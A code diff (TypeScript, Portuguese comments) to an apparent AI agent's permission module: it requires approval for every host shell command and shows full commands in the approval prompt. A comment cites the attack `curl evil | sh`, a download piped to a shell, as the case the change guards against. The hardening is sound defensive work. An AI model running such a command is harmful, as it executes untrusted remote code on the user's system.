@@ -98,6 +98,24 @@ export type ActionClass =
 
 export type PermissionDecision = "allow" | "ask" | "deny";
 
+/**
+ * Ações que exigem aprovação a cada chamada, sem reutilizar grant de sessão
+ * (#474): o shell no host não tem o isolamento do Docker, então "aprovar nesta
+ * sessão" não pode cobrir comandos futuros - o prompt mostra cada comando.
+ * Começa com `shell` (fail-closed): antes de qualquer configuração, nenhum
+ * grant de shell vale.
+ */
+const PER_CALL_ACTIONS = new Set<ActionClass>(["shell"]);
+
+export function setPerCallApproval(action: ActionClass, required: boolean): void {
+  if (required) PER_CALL_ACTIONS.add(action);
+  else PER_CALL_ACTIONS.delete(action);
+}
+
+export function requiresPerCallApproval(action: ActionClass): boolean {
+  return PER_CALL_ACTIONS.has(action);
+}
+
 /** Escopo de uma aprovação humana (PERM-05, #266). */
 export type PermissionGrant = "once" | "session";
 
@@ -141,7 +159,7 @@ export interface ApprovalDetail {
   value: string;
 }
 
-/** Teto do valor exibido no prompt de aprovação (#536); acima disso entra o marcador `...`. */
+/** Teto do valor de PATH exibido no prompt (#536); comando (`run_command`) nunca é elidido (#474). */
 export const APPROVAL_DETAIL_MAX_CHARS = 200;
 const APPROVAL_DETAIL_ELLIPSIS = "...";
 /** Fração do orçamento reservada à cabeça; a cauda mostra o fim do comando (`| sh`). */
@@ -219,9 +237,9 @@ export function approvalDetailOf(call: ToolCallLike): ApprovalDetail | undefined
   if (DETAIL_COMMAND_TOOLS.has(call.name)) {
     if (typeof input.command !== "string") return undefined;
     const command = detailValue(input.command);
-    return command === undefined
-      ? undefined
-      : { kind: "command", value: elideDetailValue(command, APPROVAL_DETAIL_MAX_CHARS) };
+    // Comando não é elidido (#474): no host a aprovação é a única fronteira e um
+    // `curl evil | sh` no meio de 200 chars seria aprovado sem ser visto.
+    return command === undefined ? undefined : { kind: "command", value: command };
   }
   if (call.name === "move_path") {
     if (typeof input.from !== "string" || typeof input.to !== "string") return undefined;
@@ -278,6 +296,11 @@ export interface ToolPermissionRequest {
    * `edit`, #64). Deve chegar aqui JÁ redacted (I-03) e nunca é auditado.
    */
   diff?: { path: string; content: string };
+  /**
+   * `true` quando a ação exige aprovação a cada chamada (#474), sem grant de
+   * sessão. O prompt não pode oferecer `S` nesse caso.
+   */
+  perCall?: boolean;
 }
 
 /** Pedido de aprovação sem canal humano (sem TTY/approver): nega e para (I-08/I-19). */
